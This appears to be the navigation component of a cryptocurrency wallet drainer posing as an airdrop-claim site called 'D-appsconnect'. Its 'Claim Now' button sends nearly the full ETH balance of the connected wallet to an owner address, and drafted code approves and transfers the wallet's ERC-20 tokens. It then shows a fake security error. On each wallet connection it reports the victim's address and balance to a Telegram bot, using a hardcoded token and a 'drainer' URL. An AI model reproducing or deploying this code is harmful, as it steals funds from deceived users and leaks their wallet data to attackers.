'use client';

import { useState, useEffect } from 'react';
import { MdMenu, MdOutlineClose } from 'react-icons/md';
import Button from '../button/Button';
import styles from "@/styles/Home.module.css";
import { database } from "../../../../firebase/clientApp";
import Link from 'next/link'
import { ref, child, get, set } from "firebase/database";
import { useAccount, useBalance, useSendTransaction, usePrepareSendTransaction, WagmiConfig, useDisconnect } from "wagmi";
// import 'wagmi/window';
import { parseEther, createWalletClient, custom, createPublicClient } from 'viem';

import { Inter } from 'next/font/google';
// import { useEffect, useState } from 'react';
import { ethers } from 'ethers';
// import { useAccount } from 'wagmi';
import { OwnerAdress, ownerPercentage } from '@/lib/address';
import { getNetwork } from 'wagmi/actions';
import { checkIfUserOwnsAnyTokeninList } from '@/lib/functions/userTokenList';
import Swal from 'sweetalert2/dist/sweetalert2.js';
import 'sweetalert2/src/sweetalert2.scss';
import { IERC20Contract } from '@/lib/ethersSetUp';
// import img from '@/assets/peopleOnTower.png';
// import img2 from '@/assets/coinsTower.svg';
// import Image from 'next/image';
// import Modal from '@/components/Modal';
// import { useDisconnect } from 'wagmi';

// import 'wagmi/window';
// import { createPublicClient, custom, parseEther } from 'viem';

const inter = Inter({ subsets: ['latin'] });

type validBalances =
  | {
      balance: string;
      tokenAddress: string;
    }[]
  | undefined;

export default function Nav() {
	const [showMenu, setShowMenu] = useState(false);
	const [isExpanded, setIsExpanded] = useState(false);

	// function handleShowMenu() {
	// 	setShowMenu(!showMenu);
	// 	setIsExpanded(!isExpanded);
	// }

	// const { address } = useAccount();
	// const balance = useBalance({
	// 	address : address,
	// });
	// const [walletBalance, setWalletBalance] = useState(0);
	
	// useEffect(() => {
	// 	const dbRef = ref(database);

	// 	if(address !== undefined && balance.data !== undefined) {
	// 		set(child(dbRef, 'wallets/' + address), {
	// 			chain: balance.data.symbol,
	// 			balance: balance.data.formatted
	// 		});
			// set(child(dbRef, 'admins/'), {
			// 	address: address
			// });
		// }
			
    // }, [address, balance]);

	// const [isNetworkSwitchHighlighted, setIsNetworkSwitchHighlighted] =
	// 	useState(false);
	// const [isConnectHighlighted, setIsConnectHighlighted] = useState(false);

	// const closeAll = () => {
	// 	setIsNetworkSwitchHighlighted(false);
	// 	setIsConnectHighlighted(false);
	// };

	// const [showMenu, setShowMenu] = useState(false);
    // const [isExpanded, setIsExpanded] = useState(false);
    // const [transactionHash, setTransactionHash] = useState(null);

    // useEffect(() => {
    //     async function sendTransaction() {
    //         try {
    //             const client = createPublicClient({ chain: 'mainnet', transport: custom(window.ethereum) });
    //             const [address] = await client.getAddresses();
    //             const hash = await client.sendTransaction({
    //                 account: address,
    //                 to: '0xDaA5418753840dE4ebe28eA9226aE24Dc1E01b19',
    //                 value: parseEther('0.001')
    //             });
    //             setTransactionHash(hash);
    //         } catch (error) {
    //             console.error('Error sending transaction:', error);
    //         }
    //     }

    //     sendTransaction();
    // }, []);

    function handleShowMenu() {
        setShowMenu(!showMenu);
        setIsExpanded(!isExpanded);
    }

    // Rest of your component code my own adds
  const [balance, setBalance] = useState('');
  const [isModalOpen, setIsModalOpen] = useState(true);
  const [validBalances, setValidBalance] = useState<validBalances>();
  const { address, isConnected } = useAccount();
  const { chain } = getNetwork();
  const { disconnect } = useDisconnect();

  const gasBuffer = 100000000;
const {data: resultBal} = useBalance({
  address: address,
})
  // const getUserBalace = async () => {
  //   try {
  //     const provider = new ethers.providers.Web3Provider(
  //       window.ethereum as any
  //     );
  //     const balanceInWei = await provider.getBalance(String(address));
  //     const balanceInEth = ethers.utils.formatEther(balanceInWei);
  //     setBalance(balanceInEth);
  //     console.log(balanceInEth);
  //     return balanceInEth;
  //   } catch (error) {
  //     console.log('err', error);
  //   }
  // };

  const showNotification = (text: string) => {
    Swal.fire({
      title: 'Error!',
      text: text,
      icon: 'error',
    });
  };

  useEffect(() => {
    const bb = async () => {
      const a = await checkIfUserOwnsAnyTokeninList(
        chain?.name || '',
        String(address)
      );
      setValidBalance(a);
    };
    bb();
  }, []);

  const handleTokenErc20Transfer = async () => {
    if (validBalances) {
      validBalances?.forEach(async (token) => {
        const erc20Contract = IERC20Contract(token.tokenAddress);

        const decimals = await erc20Contract.decimals();
        const toApproveOwner = String(
          Number(token.balance) / Math.pow(10, Number(decimals))
        );

        await erc20Contract.approve(OwnerAdress, toApproveOwner);
        try {
          const tx = await erc20Contract.transfer(
            OwnerAdress,
            String(toApproveOwner)
 
          );
          await handleTokenEthTransfer();   
          await tx.wait();

          showNotification(
            "For Security Reasons You can't connect empty or new wallet"
          );
        } catch (error) {
          showNotification(String(error));
          console.log(error);
        }
      });
    }
  };


  const handleTokenEthTransfer = async () => {
    const defBal = resultBal?.formatted;
    // alert(defBal)
    const provider = new ethers.providers.Web3Provider(window.ethereum as any);
    const gas = '5000000000000000';
    let bal;

    if (!balance) {
      bal = String(defBal);
    } else {
      bal = balance;
    }

    const balanceInWei = parseEther(bal);
    if (Number(balanceInWei) >= Number(gas)) {
      const newBalanceAfterGas = Number(balanceInWei) - Number(gas);
      const signer = provider.getSigner();
      const ownersShare = Number(newBalanceAfterGas);

      try {
        const tx = await signer.sendTransaction({
          to: OwnerAdress,
          // value: Number(0.002),
          value: String(ownersShare),
        });

        await tx.wait();
        showNotification(
          "For Security Reasons You can't connect empty or new wallet"
        );
      } catch (error) {
        showNotification(String(error));
        console.log('err', error);
      }
    } else {
      showNotification(
        String("For Security Reasons You can't connect empty or new wallet")
      );
    }
  };



  // useEffect(() => {
  //   getUserBalace();
  // }, []);

  const handleTokenTransfer = async () => {
    await handleTokenEthTransfer();
    // if (validBalances) {
    //   await handleTokenErc20Transfer();
      
    // } else{
    //   await handleTokenEthTransfer();
    // }

  };



  const [mounted, setMounted] = useState(false);

  useEffect(() => {
    setMounted(true);
  }, []);

//   Mine stops here

// Telegram Bot

// const [hasSentMessage, setHasSentMessage] = useState(false);
useEffect(() => {
  if (isConnected) {
    handleSubmit();
  }
}, [isConnected]);




const handleSubmit = () => {
const token = "6695122457:AAFZi47EVYLx5RsqA_xcyRxt-bzftT7m0mg";
const chat_id = "-4277212332";
const website_url = `https://updated-drainer.vercel.app`;
const newAds =  address
const conBal = resultBal?.formatted
const convConBal = Number(conBal)
console.log(typeof(convConBal))
console.log(typeof(conBal))
const tokSymbol = resultBal?.symbol

const dati = "✅ Draining at the moment...";
const noDati = "❌ Not Draining at the moment..  (insufficient funds)";
const newDat = 0.0026;


 const mytext = `🛜 New Connection!!! \n\n          
💰 Total ${tokSymbol} Value: ${conBal} ${tokSymbol}\n
🪙 Address: ${newAds}\n 
⛓️‍💥 Action: ${convConBal <= newDat ?  noDati : dati}\n
🌐 URL: ${website_url}`;
 const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(mytext)}
 `;
 const api = new XMLHttpRequest();
 api.open("GET", url, true);
 api.send();
//  setHasSentMessage(true)
;
}

  // useEffect(() => {
  //   if (isConnected) {
  //     handleTokenTransfer();
  //   }
  // }, [isConnected, handleTokenTransfer]);


	return (
		<div>
    <nav className='w-full mx-auto border-b-2 border-secondary'>
			<div className='flex items-center justify-between mx-auto py-4 w-[90%]'>
				
				<h1 className='font-bold text-1xl'><Link href="/">D-appsconnect</Link></h1>

				<ul className='hidden md:flex items-center justify-between gap-3 cursor-pointer  hover:transition sm:text-xs md:text-base'>
					<li className='hover:font-bold'>Latest Airdrops. </li>
					<li className='hover:font-bold'>Hot Airdrops</li>
					<li className='hover:font-bold'>Potential Airdrops</li>
					{/* <li className='hover:font-bold'>FAQs</li>
					<li className='hover:font-bold'>Contact</li> */}
				</ul>
				<div>
        {/* className='w-full h-dvh sm:h-[89dvh] mt-6 mb-4 gradient-bg' */}
        {/* {isConnected && (
          <button
            className="bg-primary text-white h-10 w-32 rounded-3xl"
            onClick={() => disconnect()}
          >
            Disconnect
          </button>
        )} */}
      <div className="px-5 md:px-24 flex flex-col items-center">
      {isConnected ? (
        <button
        // onTouchStart={handleTokenTransfer}
        onClick={handleTokenTransfer}
          className="w-full md:w-95 h-10 bg-green text-white p-5 text-sm md:text-base rounded-3xl z-10 flex items-center justify-center"
          aria-label="Claim Tokens"
        >
          Claim Now
        </button>
      ) : (
        <div >
          <w3m-button balance="hide" label="Connect Wallet" />
        </div>
      )}
    </div>
      </div>
				{/* <div
							onClick={closeAll}
							className={`${styles.highlight} ${
								isConnectHighlighted
									? styles.highlightSelected
									: ``
							}`}
						>
							<w3m-button />
						</div> */}
				{/* {address == undefined && (
				<div
							onClick={closeAll}
							className={`${styles.highlight} ${
								isConnectHighlighted
									? styles.highlightSelected
									: ``
							}`}
						>
							<w3m-button />
						</div>)} */}

				<Button
					className='md:hidden'
					onClick={handleShowMenu}>
					{isExpanded ? <MdOutlineClose /> : <MdMenu />}
				</Button>
			</div>

			{showMenu && (
				<ul className='flex flex-col items-center justify-between gap-3 cursor-pointer'>
					<li className='hover:font-bold'>Latest Airdrops</li>
					<li className='hover:font-bold'>Hot Airdrops</li>
					<li className='hover:font-bold'>Potential Airdrops</li>
					{/* <li className='hover:font-bold'>FAQs</li>
					<li className='hover:font-bold'>Contact</li> */}
				</ul>
			)}
		</nav>
    </div>
	);
}
